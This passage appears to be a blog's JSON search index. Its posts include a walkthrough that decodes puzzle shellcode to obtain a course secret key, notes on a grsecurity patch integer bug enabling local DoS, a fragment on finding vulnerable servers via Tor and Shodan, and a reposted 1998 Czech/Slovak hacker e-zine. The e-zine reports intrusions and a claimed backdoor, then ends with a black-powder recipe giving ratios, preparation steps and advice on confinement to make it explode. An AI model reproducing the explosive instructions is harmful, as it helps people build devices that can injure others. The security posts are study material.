control.\n","permalink":"https://www.burso.eu/posts/citrix-vulnerability/","summary":"NOTICE: Educational purposes only!\nHi, I want to show you how easy it is to find a vulnerable server on the internet. Okey guys, so now, firstly we need to have some TOR client for anonymity ;) Before we begin, look at the following tools\ntor nyx proxychains-ng shodan curl nmap $ tor \u0026amp; $ nyx -i 127.0.0.1:9052 Then we can test, if the tor is working correctly with proxychains","title":"How find a vulnerable server on the internet?"},{"content":"If you want to register to CTP, you will need something they call Registration Code and Secret Key. So firstly, there is interesting file /fc4.js\nfunction fc4me(srvstr) { if(!document.pleazfc4me.email.value || !document.pleazfc4me.securitystring.value) { alert(\u0026#34;Please fill in all the required fields!\u0026#34;); return false; } if(document.pleazfc4me.securitystring.value != hexMD5(\u0026#34;\\x74\\x72\\x79\\x68\\x61\\x72\\x64\\x65\\x72\u0026#34;+srvstr)) { alert(\u0026#34;Registration Authorization String not accepted! Try Harder! \u0026#34;); return false; } else { document.pleazfc4me.submit(); } } So all you need to do is setup some js variables in browser console and call fc4me(srvstr)\nvar srvstr=\u0026#39;Thursday 23rd of January 2020\u0026#39;; document.pleazfc4me.securitystring.value=hexMD5(\u0026#34;\\x74\\x72\\x79\\x68\\x61\\x72\\x64\\x65\\x72\u0026#34;+srvstr); document.pleazfc4me.email.value=\u0026#34;\u0026lt;your_email_address\u0026gt;\u0026#34;; fc4me(srvstr); After that you will obtain something like this:\nRW1haWw6IDx5b3VyX2VtYWlsX2FkZHJlc3M+ICwgUmVnaXN0cmF0aW9uIENvZGU6IDx5b3VyX3Jl Z2lzdHJhdGlvbl9udW1iZXI+IHwgTm93IGRlY29kZSB5b3VyIENUUCBTZWNyZXQgS2V5IGFuZCB5 b3UgYXJlIGRvbmUhIDogXHgzMVx4QzBceDUwXHg2OFx4MjRceDc3XHg3NVx4NzFceDY4XHg3NVx4 MjNceDc5XHgyMFx4NjhceDc4XHg3Nlx4MjRceDI1XHg2OFx4NzVceDc2XHgyMlx4MjNceDY4XHg3 N1x4NzdceDc2XHg3NVx4NjhceDc1XHgyNFx4MjVceDc0XHg2OFx4MjdceDI3XHgyMFx4MjJceDY4 XHgyNFx4NzRceDIzXHgyM1x4NjhceDIwXHg3M1x4NzFceDIwXHg2OFx4NzBceDczXHg3OVx4Nzdc eDY4XHg3OFx4NzZceDIzXHgyMFx4NjhceDc2XHgyNVx4MjVceDIyXHg2OFx4NzJceDczXHgyN1x4 NzRceDY4XHgyN1x4NzBceDc1XHg3NVx4NjhceDIwXHgyNFx4MjRceDI3XHg2OFx4NzlceDcyXHg3 Nlx4NzVceDY4XHg3N1x4NzNceDc5XHgyN1x4NjhceDI0XHgyMFx4NzRceDc3XHg2OFx4MjdceDIw XHg3NFx4MjJceDY4XHgyNVx4NzdceDIwXHg3OFx4NjhceDc1XHg3Mlx4NzlceDc0XHg2OFx4NzVc eDI0XHgyM1x4NzJceDY4XHg3Nlx4MjdceDI0XHgyNFx4NjhceDIyXHg3OVx4NzdceDczXHg2OFx4 NzRceDc5XHg3OFx4MjBceDY4XHgyNVx4MjVceDc2XHg3NFx4NjhceDI1XHg3NFx4NzFceDc2XHg2 OFx4MjdceDc1XHgyM1x4MjNceDY4XHgyNFx4MjJceDIwXHg3N1x4NjhceDIyXHgyNVx4NzNceDc4 XHg2OFx4NzNceDIzXHg3NVx4NzZceDY4XHg3M1x4NzNceDc1XHgyNVx4NTRceDVFXHg4Qlx4RkVc eDhCXHhEN1x4RkNceEI5XHg4MFx4MDBceDAwXHgwMFx4QkJceDQxXHgwMFx4MDBceDAwXHgzMVx4 QzBceDUwXHhBQ1x4MzNceEMzXHhBQVx4RTJceEZBXHg1NFx4NUVceEND Looks like BASE64 encoded text, so we can copy text to file and try to decode it.\n$ cat encoded_raw | base64 -d Email: \u0026lt;your_email_address\u0026gt; , Registration Code: \u0026lt;your_registration_number\u0026gt; | Now decode your CTP Secret Key and you are done! : \\x31\\xC0\\x50\\x68\\x24\\x77\\x75\\x71\\x68\\x75\\x23\\x79\\x20\\x68\\x78\\x76\\x24\\x25\\x68 \\x75\\x76\\x22\\x23\\x68\\x77\\x77\\x76\\x75\\x68\\x75\\x24\\x25\\x74\\x68\\x27\\x27\\x20\\x22 \\x68\\x24\\x74\\x23\\x23\\x68\\x20\\x73\\x71\\x20\\x68\\x70\\x73\\x79\\x77\\x68\\x78\\x76\\x23 \\x20\\x68\\x76\\x25\\x25\\x22\\x68\\x72\\x73\\x27\\x74\\x68\\x27\\x70\\x75\\x75\\x68\\x20\\x24 \\x24\\x27\\x68\\x79\\x72\\x76\\x75\\x68\\x77\\x73\\x79\\x27\\x68\\x24\\x20\\x74\\x77\\x68\\x27 \\x20\\x74\\x22\\x68\\x25\\x77\\x20\\x78\\x68\\x75\\x72\\x79\\x74\\x68\\x75\\x24\\x23\\x72\\x68 \\x76\\x27\\x24\\x24\\x68\\x22\\x79\\x77\\x73\\x68\\x74\\x79\\x78\\x20\\x68\\x25\\x25\\x76\\x74 \\x68\\x25\\x74\\x71\\x76\\x68\\x27\\x75\\x23\\x23\\x68\\x24\\x22\\x20\\x77\\x68\\x22\\x25\\x73 \\x78\\x68\\x73\\x23\\x75\\x76\\x68\\x73\\x73\\x75\\x25\\x54\\x5E\\x8B\\xFE\\x8B\\xD7\\xFC\\xB9 \\x80\\x00\\x00\\x00\\xBB\\x41\\x00\\x00\\x00\\x31\\xC0\\x50\\xAC\\x33\\xC3\\xAA\\xE2\\xFA\\x54 \\x5E\\xCC It is something like binary blob, let\u0026rsquo;s search it. After searching we can think about shellcode. So let\u0026rsquo;s save it to file.\n$ python -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;\\x31\\xC0\\x50\\x68\\x24\\x77\\x75\\x71\\x68\\x75\\x23\\x79\\x20\\x68\\x78\\x76\\x24\\x25\\x68\\x75\\x76\\x22\\x23\\x68\\x77\\x77\\x76\\x75\\x68\\x75\\x24\\x25\\x74\\x68\\x27\\x27\\x20\\x22\\x68\\x24\\x74\\x23\\x23\\x68\\x20\\x73\\x71\\x20\\x68\\x70\\x73\\x79\\x77\\x68\\x78\\x76\\x23\\x20\\x68\\x76\\x25\\x25\\x22\\x68\\x72\\x73\\x27\\x74\\x68\\x27\\x70\\x75\\x75\\x68\\x20\\x24\\x24\\x27\\x68\\x79\\x72\\x76\\x75\\x68\\x77\\x73\\x79\\x27\\x68\\x24\\x20\\x74\\x77\\x68\\x27\\x20\\x74\\x22\\x68\\x25\\x77\\x20\\x78\\x68\\x75\\x72\\x79\\x74\\x68\\x75\\x24\\x23\\x72\\x68\\x76\\x27\\x24\\x24\\x68\\x22\\x79\\x77\\x73\\x68\\x74\\x79\\x78\\x20\\x68\\x25\\x25\\x76\\x74\\x68\\x25\\x74\\x71\\x76\\x68\\x27\\x75\\x23\\x23\\x68\\x24\\x22\\x20\\x77\\x68\\x22\\x25\\x73\\x78\\x68\\x73\\x23\\x75\\x76\\x68\\x73\\x73\\x75\\x25\\x54\\x5E\\x8B\\xFE\\x8B\\xD7\\xFC\\xB9\\x80\\x00\\x00\\x00\\xBB\\x41\\x00\\x00\\x00\\x31\\xC0\\x50\\xAC\\x33\\xC3\\xAA\\xE2\\xFA\\x54\\x5E\\xCC\u0026#34;)\u0026#39; \u0026gt; shellcode $ ndisasm -b 32 shellcode \u0026gt; shellcode.asm $ cat shellcode.asm 00000000 31C0 xor eax,eax 00000002 50 push eax 00000003 6824777571 push dword 0x71757724 00000008 6875237920 push dword 0x20792375 0000000D 6878762425 push dword 0x25247678 00000012 6875762223 push dword 0x23227675 00000017 6877777675 push dword 0x75767777 0000001C 6875242574 push dword 0x74252475 00000021 6827272022 push dword 0x22202727 00000026 6824742323 push dword 0x23237424 0000002B 6820737120 push dword 0x20717320 00000030 6870737977 push dword 0x77797370 00000035 6878762320 push dword 0x20237678 0000003A 6876252522 push dword 0x22252576 0000003F 6872732774 push dword 0x74277372 00000044 6827707575 push dword 0x75757027 00000049 6820242427 push dword 0x27242420 0000004E 6879727675 push dword 0x75767279 00000053 6877737927 push dword 0x27797377 00000058 6824207477 push dword 0x77742024 0000005D 6827207422 push dword 0x22742027 00000062 6825772078 push dword 0x78207725 00000067 6875727974 push dword 0x74797275 0000006C 6875242372 push dword 0x72232475 00000071 6876272424 push dword 0x24242776 00000076 6822797773 push dword 0x73777922 0000007B 6874797820 push dword 0x20787974 00000080 6825257674 push dword 0x74762525 00000085 6825747176 push dword 0x76717425 0000008A 6827752323 push dword 0x23237527 0000008F 6824222077 push dword 0x77202224 00000094 6822257378 push dword 0x78732522 00000099 6873237576 push dword 0x76752373 0000009E 6873737525 push dword 0x25757373 000000A3 54 push esp 000000A4 5E pop esi 000000A5 8BFE mov edi,esi 000000A7 8BD7 mov edx,edi 000000A9 FC cld 000000AA B980000000 mov ecx,0x80 000000AF BB41000000 mov ebx,0x41 000000B4 31C0 xor eax,eax 000000B6 50 push eax 000000B7 AC lodsb 000000B8 33C3 xor eax,ebx 000000BA AA stosb 000000BB E2FA loop 0xb7 000000BD 54 push esp 000000BE 5E pop esi 000000BF CC int3 Now we have to edit the file before we can assemble it.\n$ awk \u0026#39;{$1=$2=\u0026#34;\u0026#34;; print $0}\u0026#39; shellcode.asm | sed \u0026#39;s/^ //g\u0026#39; \u0026gt; shellcode_edited.asm Save diff to patch file shellcode.patch\n--- shellcode.asm\t2020-01-23 12:29:31.345434907 +0100 +++ shellcode_diff.asm\t2020-01-23 12:28:09.689429680 +0100 @@ -1,3 +1,5 @@ +global _start +_start: xor eax,eax push eax push dword 0x71757724 @@ -41,10 +43,11 @@ mov ebx,0x41 xor eax,eax push eax +decode: lodsb xor eax,ebx stosb -loop 0xb7 +loop decode push esp pop esi int3 And apply the following patch. Then we can assemble it.\n$ patch \u0026lt; shellcode.patch $ nasm -f elf shellcode.asm $ ld -m elf_i386 -o key_ed shellcode.o Finally let\u0026rsquo;s find the secret key!\n$ gdb ./key_ed $(gdb) r $(gdb) x/s $edx 0xffffdbec:\t\u0026#34;224d2b47cd29eca6f4bbd507dd75589ac8627fee4eb34385d6a9fa5cea56628f8374aeeff14432f57ddc97ba1286a20ae5bbffac4ed5667447cb97ed4b8ae640\u0026#34; ","permalink":"https://www.burso.eu/posts/osce-prologue/","summary":"If you want to register to CTP, you will need something they call Registration Code and Secret Key. So firstly, there is interesting file /fc4.js\nfunction fc4me(srvstr) { if(!document.pleazfc4me.email.value || !document.pleazfc4me.securitystring.value) { alert(\u0026#34;Please fill in all the required fields!\u0026#34;); return false; } if(document.pleazfc4me.securitystring.value != hexMD5(\u0026#34;\\x74\\x72\\x79\\x68\\x61\\x72\\x64\\x65\\x72\u0026#34;+srvstr)) { alert(\u0026#34;Registration Authorization String not accepted! Try Harder! \u0026#34;); return false; } else { document.pleazfc4me.submit(); } } So all you need to do is setup some js variables in browser console and call fc4me(srvstr)","title":"OSCE Prologue or How to get Secret key to CTP?"},{"content":" moongen\nnmap-vulners is great script for automatically find possible issues of services on opened ports. It\u0026rsquo;s partly replacing Nessus, but it\u0026rsquo;s open source. It is using vulners database for finding possible vulnerabilities. Vulners is also great tool, because it allows check all your installed packages. You can find it in audit section.\ntaskwarrior\nshamir secret sharing\nrestic\nkhal\n","permalink":"https://www.burso.eu/posts/34c3-tuwat/","summary":"moongen\nnmap-vulners is great script for automatically find possible issues of services on opened ports. It\u0026rsquo;s partly replacing Nessus, but it\u0026rsquo;s open source. It is using vulners database for finding possible vulnerabilities. Vulners is also great tool, because it allows check all your installed packages. You can find it in audit section.\ntaskwarrior\nshamir secret sharing\nrestic\nkhal","title":"Notes from #34c3"},{"content":"I think you sure know linux kernel patches from grsecurity. In follow tweet you can read about size overflow in patch from grsec.\nTweet was in the meanwhile deleted.\nSo what is the problem in this patch? When you change int (signed value) to size_t (unsigned value), you have to be sure you are saving unsigned value.\nroom = N_TTY_BUF_SIZE - (ldata-\u0026gt;read_head - tail); And what happens when the right site will have negative value? Let’s show it on the very simple example\n$ cat test.c #include \u0026lt;stdio.h\u0026gt; int main(void) { size_t a = -15; printf(\u0026#34;%lu\\n\u0026#34;, a); return 0; } $ gcc -Wall test.c -o test $ ./test 18446744073709551601 Small negative value (for example: -15) sets the big unsigned value. For better understand you can read this. And this problem can cause local DoS attack on your system via 100%cpu usage.\nSOLUTION\nYou have to check, if the value is not negative, so we can use ternary operator for this quick fix\nroom = ((N_TTY_BUF_SIZE - (ldata-\u0026gt;read_head - tail)) \u0026gt; 0) ? N_TTY_BUF_SIZE - (ldata-\u0026gt;read_head - tail) : 0; ","permalink":"https://www.burso.eu/posts/grsec-patch-size-overflow/","summary":"I think you sure know linux kernel patches from grsecurity. In follow tweet you can read about size overflow in patch from grsec.\nTweet was in the meanwhile deleted.\nSo what is the problem in this patch? When you change int (signed value) to size_t (unsigned value), you have to be sure you are saving unsigned value.\nroom = N_TTY_BUF_SIZE - (ldata-\u0026gt;read_head - tail); And what happens when the right site will have negative value?","title":".grsec patch size_overflow"},{"content":" ::::::::::. :::::::.. :::.,:::::: ::: ... . : `;;;```.;;;;;;;``;;;; ;;;;;;;\u0026#39;\u0026#39;\u0026#39;\u0026#39; ;;; .;;;;;;;. ;;,. ;;; `]]nnn]]\u0026#39; [[[,/[[[\u0026#39; [[[ [[cccc [[[ ,[[ \\[[,[[[[, ,[[[[, $$$\u0026#34;\u0026#34; $$$$$$c $$$ $$\u0026#34;\u0026#34;\u0026#34;\u0026#34; $$\u0026#39; $$$, $$$$$$$$$$$\u0026#34;$$$ 888o 888b \u0026#34;88bo,888 888oo,__ o88oo,.__\u0026#34;888,_ _,88P888 Y88\u0026#34; 888o YMMMb MMMM \u0026#34;W\u0026#34; MMM \u0026#34;\u0026#34;\u0026#34;\u0026#34;YUMMM\u0026#34;\u0026#34;\u0026#34;\u0026#34;YUMMM \u0026#34;YMMMMMP\u0026#34; MMM M\u0026#39; \u0026#34;MMM prielom #1, 6.1.98, prielom(at)hysteria.sk, http://hysteria.sk/prielom/ intro vianocny kapor bol super, ze ? ked som na stedry den tlacil do hlavy vyprazaneho kapra, bola este fajn atmoska, ked som sa vsak potom vramci po-vianocnych rodinnych navstev musel pozerat na spontanne-slintajucu babicku, sxizoidnu tetu a ozraleho stryka a potom nastupit po novom roku do roboty, bolo po nalade. prisli dlhe zimne januarove vecery a s nimi napad na elektronicky casopis, ktory by nebol nicim podobny na neviditelneho psa, netacika, modry svet a pod.. ale ktory by bol tak trochu o vsetkom ostatnom. a tak je tu prve cislo e-zinu \u0026ldquo;prielom\u0026rdquo;.. xcel by som aby to bol tak zhruba dvojtyzdennik, alebo aspon mesacnik, pravdepodobne to vsak bude \u0026ldquo;naladovnik\u0026rdquo;, cize nove cislo prielomu vyjde vzdy ked budem mat fajn naladu a volny cas. xcel by som aby prielom prinasal spravy o tej casti internetu, ktoru nepokryvaju uz existujuce elektronicke casopisy. pre zaciatok planujem prinasat nejake spravicky o computer undergrounde (pokial take nieco existuje), hackeroch, bezpecnosti pocitacovych sieti a tak\u0026hellip; xcem sa vyvarovat zbytocnych omaciek a radsej podavat polosurove informacie zozbierane z roznych kutikov internetu bez zbytocnych komentarov.. planujem spravit nejake preklady zahranicnych zdrojov.. uz vobec by som sa vsak nechcel montovat do nejakych pseudointelektualnych uvah o kyberpunku, kyberpriestore a podobnych blbostiach, na to tu predsa mame casopis \u0026ldquo;zivel\u0026rdquo;. ako ste si vsimli, neuznavam grafiku, java scripty, animovane gify tlieskajucich ninja-kortynaciek a podobne somariny moderneho webu. tiez neuznavam diakritiku, asi preto lebo ju moj linuxik nepodporuje. moja nelaska k velkym pismenam prameni z niekolkych rokov stravenych na irc, tam sa na take veci zvysoka kasle. dufam ze aj v takejto podobe sa to tu da vcelku zrozumitelne citat.. pripomienky, otazky, podnety a podobny komunikacny chabrus smerujte na prielom(at)hysteria.sk. vesele citanie\npajka, 28.1., liptovsky mikulas.\n5 milionov hacknutych zo slovenskej sporitelne do pocitacovej siete slovenskej sporitelne vstupil 14. januara 29-rocny haqer z trnavy a z vnutrobankoveho uctu v kosiciach si pretransferoval 5 melonov. peniaze si previedol na svoj vlastny ucet do trnavy.. to bol zjavne ten kamen urazu.. na druhy den si to prehodil na svoj ucet do tatrabanky. potom sa rozbehol vybrat si peniaze v hotovosti, ale samozrejme uz na neho cakala policia a zadrzala ho pekne v banke. momentalne sa nachadza vo vysetrovacej vazbe.\ncina zverejnila zbierku zakonov urcenych na cenzuru internetu 30. decembra 1997 zverejnilo ministerstvo vnutra ciny novu vyhlasku o \u0026ldquo;regulacii bezpecnosti a manazmentu pocitacovych informacnych sieti a internetu\u0026rdquo;. nemyslim si ze by Cina zmenila nejak radikalne svoj postoj k internetu, skor islo o to, ze sa skupinka komunistickych internet-analfabetov pokusila napisat zbierku pravidiel a zakonov ktore by dokazali rozskatulkovat obrovske mnozstvo informacii na internete a vyradit vsetko \u0026ldquo;nevhodne\u0026rdquo;. plne znenie originalu a aj anglickeho prekladu tychto zakonov je zverejneny kdesi na internete. medzi najabsurdnejsie patria :\nje zakazane prostrednictvom internetu tvorit klamstva alebo menit pravdu, rozsirovat klebety, narusovat poriadok v spolocnosti. (paragraf 5, odsek 5)\nje zakazane prostrednictvom internetu propagovat feudalne nazory, sexualne sugestivny material, hazardne hry, nasilie, vrazdy (paragraf 5, odsek 6)\nje zakazane prostrednictvom internetu poskodzovat povest statnych organov (paragraf 5, odsek 8)\njeden z paragrafov tiez zakazuje usilovat sa o \u0026ldquo;rozdelenie krajiny\u0026rdquo;, cim cina priamo atakuje separatisticke hnutia v Tibete a Xinjiangu. cina tiez priamo blokuje domace stranky vacsiny cinskych dissidentov, ktori pouzivaju internet na politicky boj a na svojich www strankach kritizuju cinsku vladu.\nnova zbierka zakonov je tiez urcena na filtrovanie pocitacovej kriminality, hackovania, virusov a podobne. Ako trest za tento druh kriminality uviedli blizsie nespecifikovane \u0026ldquo;kriminalne tresty\u0026rdquo; a financne pokuty do 15,000 juanov (priblizbe 65 000 Sk).\ncZert session v prahe v sobotu 17.1. sa uskutocnila cZert session v prahe. bolo tam asi zo dvadsat-tridsat haqerozov, kyberadminov, lameroidov a aj zopar ludi.. ja vlastne ani presne neviem kto tam vsetko bol, ale ak to xcete vediet - spytajte sa policie ceskej republiky. perlickou celej akcie totiz bol zasah policie, ktory zacal tym, ze na vaclavaku pred konom postavali dvaja prudko nenapadni pani a natacali celu session na kameru. ked na nich par ludi od cZertu ukazalo prstom, hned trhli kamerou a zacali natacat vchod do metra\u0026hellip; neskor sa cela session presunula do istej restauracie v centre prahy. tam po hodinke veselej konverzacie vtrhlo sest policajtov a vyzvali vsetkych pritomnych aby sa legitimovali. nase protestne otazky odbavili imho dost trapnu vyhovorku, zevraj dostali informaciu ze sa v tej restauracii nachadza \u0026ldquo;pachatel loupezniho prepadeni\u0026rdquo;. na otazky ohladne popisu tohoto pachatela odpovedali ze \u0026ldquo;kazdy z tady pritomnych by zodpovedel tomu popisu\u0026rdquo;. no a tak si opisali udaje z nasich dokladov a odficali prec. seteuid dokonca tvrdil na mamedii ze zistil ze sa v tej restauracii nachadzali aj traja slimaci, t.j. undercover fizli.. je mi ich dost luto, lebo museli chudaci cely vecer pocuvat a este nedajboze aj zapisovat nasu unixacko-kompjuteroidnu konverzaciu.\no tom, ze policia ceskej republiky teda konecne odhalila cZerta teda uz nie je ziadnych pochyb. koniec-koncov aj pan policajny kapitan jiri dastych oznamil na tlacovke v brne ze uz je cZertovi na stope a ze je iba otazka casu kedy ho strci za mreze. teraz ked uz policia pozna haqerozov uz zostava policajstkemu zboru iba zistit kde je to ten \u0026ldquo;internet\u0026rdquo;, co je to ten \u0026ldquo;unix\u0026rdquo;, ake zariadenie je to vlastne ten \u0026ldquo;server\u0026rdquo;. pravdepodobne na zistenie tychto informacii sluzila sobotnajsia policajna akcia.\nunicef hacked 7. januara hackla skupina hackerov pod nalepkou DAMM (Drunkz Against Madd Mothers) domacu stranku organizacie unicef. hackeri zmenili html fajly a vyvesili tam vystrahu ze spravia z internetu \u0026ldquo;holocaust\u0026rdquo;, ak nebude prepusteny kevin mitnick. kevin mitnick - znamy emericky hacker, pravda, stale sedi vo federalnom vezeni za par veci suvisiacich s behanim po serveroch. DAMM odovodnil hacknutie unicefu tym, ze \u0026ldquo;kevin mitnick je vlastne iba velke decko, a unicef je tu prave na to aby ochranoval decka\u0026rdquo;. dalej tam uviedli ze ak do 20. februara neprepustia kevina mitnicka z lapaku, kazdy den podhodia 100 deti dvadsat vyhladovelym super-modelkam. zo zdroju blizkeho irc som sa dozvedel ze je to ta ista parta hackerov ktora na par minut hackla yahoo. o tom hacku na www.yahoo.com sa hovorilo zevraj sa tam umiestnil nejaky virus ktori si vsetci navstevnici stiahli. ten virus mal niekedy koncom januara \u0026lsquo;98 znicit cely internet. bol to samozrejme dost nevydareny zartik, ale ked si k nemu primyslime tupu ignorantsku nevedomost o svete pocitacov, v ktorom vacsina novinarov zije, vznikol z toho skandal ktory niekolko tyzdnov zivoril na titulnych strankach mnohych novin.\nunicef ma tiez stranky aj v cechah a na slovensku. v cechach je to u inet providera lanprojekt, o ktorom je uz asi dost zname ze tam cZert obcas robi kabaret. asi uz nie je velke tajomstvo ze sa na www.unicef.cz nachadza 5002 cZert backdoor, akurat sa zjavne caka na niekoho kto by spravil html fajly.\nkriminalista chyta darebaky pocitacem kdyz chce kapitan jiri dastych z prazske kriminalky chytit nejakeho lotra, tak si nenazuje pohodlne boty ani si nevezme do kapsy lupu. usedne k pocitaci. jeho praci je totiz stihani pocitacovych piratu. \u0026ldquo;je to prace jako kazda jina, nic atraktivniho na ni nevidim,\u0026rdquo; rika muz, ktery sam sebe oznacuje za jedineho predstavitele softwarove policie v zemi. kazdy den useda v kancelari ke svemu soukromemu pocitaci s postarsim procesorem 486, ktery by byl tem, po nichz patra, nejspis pro smich. \u0026ldquo;ne, policejni pocitac nemam. donesl jsem si do prace svuj vlastni, abych mel na cem delat,\u0026rdquo; prozrazuje stripek ze zakulisi boje s pocitacovou kriminalitou dastych. \u0026ldquo;mame vyhodu, ze pocitacova kriminalita je pomerne mlada a zlocinci pred nami nemaji takovy naskok. o krok pozadu za nimi ale budeme porad,\u0026rdquo; tvrdi kriminalista. presto podle neho nema vyznam zakladat pro boj s pocitacovou kriminalitou specialni utvar, spis mu jde o rozjeti systemu, v nemz by bezni policiste chytali pocitacove piraty stejne samozrejme jako zlodeje z kocarkarny. \u0026ldquo;zakladat specialni oddeleni by bylo uplne zbytecne. sit distributoru ilegalniho softwaru u nas neni nijak rozsahla. vetsinou jde jen o dva tri nadsence, z nichz jeden ma treba pres internet pristup k softwaru a ostatni kopiruji diskety a cedecka, ktera dal prodavaji bud na burzach, nebo na inzerat,\u0026rdquo; vysvetluje dastych. podle neho neni problem dostat na jeden cd-rom nelegalni software za milion korun. pak ovsem muze jit pachatel za jedine piratske cedecko do vezeni az na pet let. jak vypada bezne vybaveni pocitacoveho pirata, si mohli prohlednout navstevnici na veletrhu invex ve stanku policie a ministerstva vnitra. v prosklenych vitrinach zde byly k videni pocitace, katalogy, hory cd-rom, disket a tvare odhalenych piratu prelepene cernou paskou. \u0026ldquo;byl to muj napad,\u0026rdquo; priznava pysne kriminalista. \u0026ldquo;aby si navstevnici uvedomili, ze pocitacovi pirati jsou lide z masa a krve. ze se jim muze stat kazdy, kdo si nelegalne zkopiruje od kamarada disketu,\u0026rdquo; vysvetluje svuj zamer. krome pocitacovych piratu se kapitan dastych pidi i po takzvanych hackerech, kteri se na internetu pokouseji probourat na nepovolena mista. nekdy se jim to povede, jako letos na jare hackerovi, ktery se oznacuje jako czert. ten se dostal na webovske stranky nekolika ministerstev a ty pak neuctive pozmenil. \u0026ldquo;czert ted zalezl, chytit ho muzeme, az zas neco provede,\u0026rdquo; konstatuje dastych. je presvedcen, ze czert neni jeden clovek, ale parta mladych lidi, kteri bydli v hlavnim meste. \u0026ldquo;hackeri jsou takovi pocitacovi exhibicionisti. predpokladam, ze az je chytneme, budou pysni na to, jak nam zamotali hlavy,\u0026rdquo; uvazuje jediny softwarovy policista v zemi. (zdroj : daniel zasmeta, mf dnes)\nStrelny prach (Cerny prach) Strelny prach je takovej zakladni pyromanskej artefakt hned po sirkach a granatech. Je to asi nejstarsi vybusnina na svete, ktera se pouziva dodnes. Sama o sobe samozrejme nevybuchuje. Sama o sobe pouze prudce hori a produkuje spoustu dymu. K tomu, aby strelny prach vyvolala detonaci potrebujete nejakou pevnou krabicku nebo uzavrenou trubku nebo cokoliv pevneho do ceho ho nasypete. Tim tlakem ktery vyvine nastane vybuch. A nebo se muzete pouzit jako palivo do raketoveho motoru, ale ten s popiseme az v neterem pristim dile.\nA nini pristupme k vyrobe, strelneho prachu. Ta je celkem snadna potrebujete pouze : Drevene uhli, KNO3 - Dusicnan Draselny (Da se bezne sehnat v drogerii, jelikoz se pouziva jako hnojivo a na konzervaci masa) a Siru. Kazda z latek se dukladne rozemele a rozetre v treci misce na jemny prasek a pote se smisi s ostatnimy. V tomto pomeru :\nKNO3 (Dusicnan draselny) \u0026hellip; 75% Sira \u0026hellip; 10% Drevene uhli \u0026hellip; 15% Dokonale se promycha. A tim vznikne obycejny strelny prach. Pokud chcete aby horlavost byla jeste lepsi tak ho zkuste namocit a potom ususit. Znovu peclive rozetrit a rozemlyt to muzete nekolikrat zopakovat. Tim vznikne opravdu dokonale horlavy strelny prach. Mozek\n","permalink":"https://www.burso.eu/posts/prielom-1/","summary":"::::::::::. :::::::.. :::.,:::::: ::: ... . : `;;;```.;;;;;;;``;;;; ;;;;;;;\u0026#39;\u0026#39;\u0026#39;\u0026#39; ;;; .;;;;;;;. ;;,. ;;; `]]nnn]]\u0026#39; [[[,/[[[\u0026#39; [[[ [[cccc [[[ ,[[ \\[[,[[[[, ,[[[[, $$$\u0026#34;\u0026#34; $$$$$$c $$$ $$\u0026#34;\u0026#34;\u0026#34;\u0026#34; $$\u0026#39; $$$, $$$$$$$$$$$\u0026#34;$$$ 888o 888b \u0026#34;88bo,888 888oo,__ o88oo,.__\u0026#34;888,_ _,88P888 Y88\u0026#34; 888o YMMMb MMMM \u0026#34;W\u0026#34; MMM \u0026#34;\u0026#34;\u0026#34;\u0026#34;YUMMM\u0026#34;\u0026#34;\u0026#34;\u0026#34;YUMMM \u0026#34;YMMMMMP\u0026#34; MMM M\u0026#39; \u0026#34;MMM prielom #1, 6.1.98, prielom(at)hysteria.sk, http://hysteria.sk/prielom/ intro vianocny kapor bol super, ze ? ked som na stedry den tlacil do hlavy vyprazaneho kapra, bola este fajn atmoska, ked som sa vsak potom vramci po-vianocnych rodinnych navstev musel pozerat na spontanne-slintajucu babicku, sxizoidnu tetu a ozraleho stryka a potom nastupit po novom roku do roboty, bolo po nalade.","title":".prielom #1"}]